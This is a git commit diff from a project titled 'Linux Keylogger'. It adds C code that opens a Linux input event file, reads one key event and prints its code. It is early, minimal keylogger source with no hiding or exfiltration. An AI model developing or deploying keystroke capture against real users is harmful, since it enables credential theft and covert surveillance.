c881eb2bdfc2b900e8cc4c4a91dcf98c5ad10657
WHITEROSE <firasmoussa60@gmail.com>
2026-02-28 22:22:05 +0100

    log keypress

--- main.c
+++ main.c
@@ -1,7 +1,26 @@
 #include <stdio.h>
+#include <linux/input.h>
+#include <fcntl.h>
+#include <unistd.h>
 
 
-int main() {
+int main(int argc, char *argv[]) {
+
+    if (argc != 2) 
+    {
+        printf("Usage: %s <event-file-path>\n", argv[0]);
+        return -1;
+    }
     printf("Linux Keylogger\n");
+    
+
+    int fd = open(argv[1], O_RDONLY, 0);
+
+    struct input_event ie;
+
+    read(fd, &ie, sizeof(ie));
+
+    printf("Key pressed: %d\n", ie.code);
+
     return 0;
 }
